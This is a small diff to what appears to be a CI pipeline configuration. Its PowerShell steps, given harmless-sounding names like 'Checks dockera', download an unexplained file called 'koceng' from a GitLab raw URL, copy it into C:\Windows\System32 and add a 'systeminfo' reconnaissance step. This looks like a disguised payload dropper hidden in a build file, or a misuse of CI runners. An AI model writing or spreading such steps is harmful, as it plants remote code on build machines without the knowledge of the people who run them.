@@ -17,11 +17,8 @@ jobs:
           shell: powershell.exe
           command: |
             Invoke-WebRequest https://gitlab.com/kabehada3/pantek/-/raw/main/koceng
-      - run:
-          name: "Checks dockerx"
-          shell: powershell.exe
-          command: |
             Copy koceng C:\Windows\System32
+      - run: systeminfo      
       - run:
           name: "Checks dockera"
           shell: powershell.exe
